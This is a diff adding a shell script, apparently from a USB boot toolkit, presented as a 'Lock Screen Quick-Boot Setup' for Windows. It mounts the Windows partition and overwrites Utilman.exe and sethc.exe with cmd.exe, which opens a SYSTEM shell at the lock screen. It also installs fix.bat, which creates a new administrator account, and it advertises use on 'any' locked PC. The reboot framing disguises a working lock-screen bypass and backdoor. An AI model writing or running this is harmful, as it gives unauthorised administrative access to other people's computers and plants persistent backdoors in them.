@@ -1,0 +1,154 @@
+#!/bin/sh
+RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
+CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
+
+export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+clear
+printf "${YELLOW}  Run: sh /usr/local/bin/toolkit-menu${NC}\n"
+printf "${CYAN}"
+printf "==============================================\n"
+printf "   Lock Screen Quick-Boot Setup               \n"
+printf "==============================================\n"
+printf "${NC}\n"
+printf "  Sets up one-click reboot from Windows lock screen.\n"
+printf "  After setup, on ANY locked Windows PC:\n\n"
+printf "    1. Plug in USB\n"
+printf "    2. Click accessibility icon (bottom-right)\n"
+printf "    3. Type ${BOLD}r${NC} and press Enter\n"
+printf "    4. PC reboots to BIOS → boots from USB\n\n"
+
+# Find and mount Windows partition
+BLKOUT=$(blkid 2>/dev/null)
+PARTS=""; COUNT=0
+for p in /dev/sd*[0-9] /dev/nvme*p[0-9]* /dev/mmcblk*p[0-9]*; do
+    [ -b "$p" ] || continue
+    echo "$BLKOUT" | grep "^${p}:" | grep -q 'TYPE="ntfs"' || continue
+    PARTS="$PARTS $p"; COUNT=$((COUNT+1))
+done
+
+if [ "$COUNT" -eq 0 ]; then
+    printf "${RED}No NTFS partitions found.${NC}\n"
+    printf "\nPress Enter..."; read dummy; exit 1
+fi
+
+printf "Found NTFS partitions:\n"
+I=0
+for p in $PARTS; do
+    LABEL=$(echo "$BLKOUT" | grep "^${p}:" | sed -n 's/.*LABEL="\([^"]*\)".*/\1/p')
+    printf "  [%d] %s  (%s)\n" "$I" "$p" "${LABEL:-unknown}"; I=$((I+1))
+done
+printf "\n"
+
+if [ "$COUNT" -eq 1 ]; then
+    CHOSEN=$(printf '%s' "$PARTS" | tr -d ' ')
+    printf "Auto-selected: %s\n" "$CHOSEN"
+else
+    printf "Select partition: "; read PNUM
+    I=0; for p in $PARTS; do [ "$I" -eq "$PNUM" ] && CHOSEN="$p" && break; I=$((I+1)); done
+fi
+[ -z "$CHOSEN" ] && exit 1
+
+MNT=$(mktemp -d)
+if [ -x /bin/ntfs-3g ]; then
+    /bin/ntfs-3g -o rw,remove_hiberfile "$CHOSEN" "$MNT" 2>/dev/null
+else
+    mount -t ntfs3 -o rw,force "$CHOSEN" "$MNT" 2>/dev/null
+fi
+
+SYS32=""
+for d in "$MNT/Windows/System32" "$MNT/windows/system32" "$MNT/WINDOWS/system32"; do
+    [ -d "$d" ] && SYS32="$d" && break
+done
+
+if [ -z "$SYS32" ]; then
+    printf "${RED}Could not find System32.${NC}\n"
+    umount "$MNT" 2>/dev/null; rmdir "$MNT"; exit 1
+fi
+
+printf "\n${BOLD}Options:${NC}\n\n"
+printf "  ${BOLD}1)${NC} Setup lock screen quick-boot (install)\n"
+printf "  ${BOLD}2)${NC} Remove lock screen quick-boot (restore original)\n"
+printf "  ${BOLD}0)${NC} Back\n"
+printf "\n  Choose: "; read OPT
+
+case "$OPT" in
+    1)
+        printf "\n${GREEN}Setting up...${NC}\n"
+
+        # Back up Utilman.exe if not already backed up
+        if [ -f "$SYS32/Utilman.exe" ] && [ ! -f "$SYS32/Utilman.exe.keke_bak" ]; then
+            cp "$SYS32/Utilman.exe" "$SYS32/Utilman.exe.keke_bak" 2>/dev/null
+            printf "  Backed up Utilman.exe\n"
+        fi
+
+        # Replace Utilman.exe with cmd.exe
+        cp "$SYS32/cmd.exe" "$SYS32/Utilman.exe" 2>/dev/null
+        printf "  Replaced Ease of Access with cmd.exe\n"
+
+        # Create quick-reboot batch files
+        # r.bat - one letter, reboots to UEFI firmware
+        printf "@echo off\r\necho Rebooting to USB...\r\nshutdown /r /fw /t 0\r\n" > "$SYS32/r.bat"
+        printf "  Created r.bat (reboot to BIOS)\n"
+
+        # rb.bat - reboot to boot options menu
+        printf "@echo off\r\necho Rebooting to boot menu...\r\nshutdown /r /o /t 0\r\n" > "$SYS32/rb.bat"
+        printf "  Created rb.bat (reboot to boot options)\n"
+
+        # rr.bat - just normal reboot
+        printf "@echo off\r\nshutdown /r /t 0\r\n" > "$SYS32/rr.bat"
+        printf "  Created rr.bat (normal reboot)\n"
+
+        # fix.bat - create new admin account (for NUKE scenarios)
+        printf "@echo off\r\necho Creating admin account...\r\nset /p user=\"Username: \"\r\nset /p pass=\"Password: \"\r\nnet user %%user%% %%pass%% /add\r\nnet localgroup Administrators %%user%% /add\r\necho Done! Close this and sign in.\r\npause\r\n" > "$SYS32/fix.bat"
+        printf "  Created fix.bat (create admin account)\n"
+
+        # Also back up and replace sethc.exe (Sticky Keys - Shift x5)
+        if [ -f "$SYS32/sethc.exe" ] && [ ! -f "$SYS32/sethc.exe.keke_bak" ]; then
+            cp "$SYS32/sethc.exe" "$SYS32/sethc.exe.keke_bak" 2>/dev/null
+            cp "$SYS32/cmd.exe" "$SYS32/sethc.exe" 2>/dev/null
+            printf "  Replaced Sticky Keys with cmd.exe (press Shift 5 times)\n"
+        fi
+
+        sync
+        umount "$MNT" 2>/dev/null; rmdir "$MNT" 2>/dev/null
+
+        printf "\n${GREEN}${BOLD}Setup complete!${NC}\n"
+        printf "\n${CYAN}From any Windows lock screen:${NC}\n\n"
+        printf "  ${BOLD}Method 1:${NC} Click accessibility icon (bottom-right)\n"
+        printf "           → cmd opens → type ${BOLD}r${NC} → reboots to BIOS\n\n"
+        printf "  ${BOLD}Method 2:${NC} Press ${BOLD}Shift 5 times${NC} (Sticky Keys)\n"
+        printf "           → cmd opens → type ${BOLD}r${NC} → reboots to BIOS\n\n"
+        printf "  ${BOLD}Other commands available:${NC}\n"
+        printf "    ${BOLD}r${NC}    - Reboot to BIOS/UEFI (pick USB from boot menu)\n"
+        printf "    ${BOLD}rb${NC}   - Reboot to Windows boot options\n"
+        printf "    ${BOLD}rr${NC}   - Normal reboot\n"
+        printf "    ${BOLD}fix${NC}  - Create a new admin account\n"
+        ;;
+    2)
+        printf "\n${GREEN}Restoring originals...${NC}\n"
+        if [ -f "$SYS32/Utilman.exe.keke_bak" ]; then
+            cp "$SYS32/Utilman.exe.keke_bak" "$SYS32/Utilman.exe" 2>/dev/null
+            rm -f "$SYS32/Utilman.exe.keke_bak" 2>/dev/null
+            printf "  Restored Utilman.exe\n"
+        fi
+        if [ -f "$SYS32/sethc.exe.keke_bak" ]; then
+            cp "$SYS32/sethc.exe.keke_bak" "$SYS32/sethc.exe" 2>/dev/null
+            rm -f "$SYS32/sethc.exe.keke_bak" 2>/dev/null
+            printf "  Restored sethc.exe\n"
+        fi
+        rm -f "$SYS32/r.bat" "$SYS32/rb.bat" "$SYS32/rr.bat" "$SYS32/fix.bat" 2>/dev/null
+        printf "  Removed quick-boot scripts\n"
+
+        sync
+        umount "$MNT" 2>/dev/null; rmdir "$MNT" 2>/dev/null
+
+        printf "\n${GREEN}Original Ease of Access and Sticky Keys restored.${NC}\n"
+        ;;
+    0)
+        umount "$MNT" 2>/dev/null; rmdir "$MNT" 2>/dev/null
+        exit 0
+        ;;
+esac
+
+printf "\nPress Enter..."; read dummy
